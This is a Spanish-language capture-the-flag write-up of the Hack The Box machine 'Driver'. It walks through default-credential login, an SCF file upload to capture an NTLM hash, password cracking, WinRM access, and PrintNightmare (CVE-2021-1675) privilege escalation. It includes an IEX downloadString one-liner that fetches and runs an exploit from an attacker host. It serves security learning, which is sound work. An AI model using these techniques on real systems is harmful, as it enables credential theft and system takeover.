
---
- Tags: #windows #HTB #Easy #CVE 
--- 
#### QUÉ SE EXPLOTA?

Password Guessing
SCF Malicious File
Print Spooler Local Privilege Escalation (PrintNightmare) [[CVE-2021-1675]]

#### WRITE UP 

##### PRIMERA FASE: Reconocimiento
**Vamos a empezar** como siempre con los primeros escaneos de rutina empezando por establecer una conexión **icmp** con **ping** 

![[Pasted image 20251115143229.png]]

Vemos que estamos ante una maquina **windows** por lo que proseguimos a hacer los 2 escaneos fundamentales. 

**El primer escaneo lo ocupamos para descubrir todos los puertos disponibles en un equipo**. Para el primer escaneo vamos a ocupar un **SYN scan** 

**El segundo escaneo lo ocupamos para recopilar mayor información sobre los puertos previamente encontrados**. 

![[Pasted image 20251115143246.png]]

**Nos encontramos ante una maquina Windows con los puerto 80,135,445,5985 abiertos**

Lo primero que hicimos con **[[crackmapexec]]** fue tratar de listar la mayor información sobre el cliente **[[SMB]]**
```bash
crackmapexec smb 10.10.11.106
```

![[Pasted image 20251115143959.png]]

Posteriormente, intentamos **autenticarnos con una sesión nula a través de smbclient** sin emgargo necesitamos credenciales válidas para poder conectarnos a **[[SMB]]**

```bash
smbclient -L 10.10.11.106 -N 
```
![[Pasted image 20251115144040.png]]

**Cómo también vimos el puerto 80 abierto** decidimos pasar a investigar la página. **Al momento de entrar** se nos pidió que nos autenticaramos con **usuario** y **contraseña** intentamos con unas genericas.. 

**admin:admin**

y entramos

![[Pasted image 20251115150650.png]]

![[Pasted image 20251115150708.png]]

**Encontramos una sección donde podemos subir archivos**. Por lo que pensamos primero es subir un archivo **[[scf]]** ya que al parecer lo que se suba los admin lo van a revisar. 

![[Pasted image 20251117180607.png]]

##### SEGUNDA FASE: Explotación

**Creamos el archivo [[scf]]** lo subimos y con **impacket-smbserver nos creamos un servidor** de esa manera el archivo malicioso hará la busqueda del ícono a nuestro recurso de red. 

**Una vez que el servidor ya está activo** esperamos a que nos caiga la conexión. 

![[Pasted image 20251117181432.png]]
**Recibimos la conexión y por ende el hash [[NTLM]]**. Proseguimos a crackear la contraseña con el **rockyou.txt. y con [[John the ripper]]**

![[Pasted image 20251117181812.png]]

**Con [[crackmapexec]]** verificamos que el usuario y la contraseña son válidos:

![[Pasted image 20251117181950.png]]
**Tenemos credenciales válidas** 

Recordemos que en la fase de escaneos descubrimos **el puerto 5985** que corresponde a **[[WinRM]]**

Así que con **[[crackmapexec]]** nos tratamos de conectar a través de **[[WinRM]]** con las credenciales obtenidas para validar. 

![[Pasted image 20251117182718.png]]

**Con la herramienta [[evil-winrm]]** nos conectamos. 

```bash
evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'
```

![[Pasted image 20251117183204.png]]

![[Pasted image 20251117183326.png]]
**Obtenemos la primer bandera** 

##### TERCERA FASE: PostExplotación - PrivEsc

Buscamos vectores para escalar, pero, no encontramos nada por lo que **proseguimos a intentar con [[WinPeas]]**. 

**Primero descargamos [[WinPeas]] en nuesto directorio compartido** en este caso la ruta de **/content** para posteriormente a través de **[[SMB]]** compartir el **.exe** 

```cmd

upload /home/eyn_rand/Desktop/HTB/DRIVER/content/winPEASx64.exe
```

**En la sección de puertos abiertos y conexiónes** encontramos un servicio llamado **[[spoolsv]]** al cual **hay vulnerabilidades**. 

**Buscamos algún exploit en github** relacionado a **[[spoolsv]]**. 
Encontramos uno relacionado al **[[CVE-2021-1675]]**. 

**Lo descargamos en nuestro sistema** para posteriormente pasarlo a la maquina victima

![[Pasted image 20251117193643.png]]

```cmd
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/CVE...')
```

Al ejecutar el script **nos crea un nuevo usuario con privilegios** comprobamos con **[[crackmapexec]]** y listo nos conectamos con **[[WinRM]]** al nuevo usuario con privilegios. 


![[Pasted image 20251117194021.png]]

![[Pasted image 20251117194126.png]]

**LISTO**




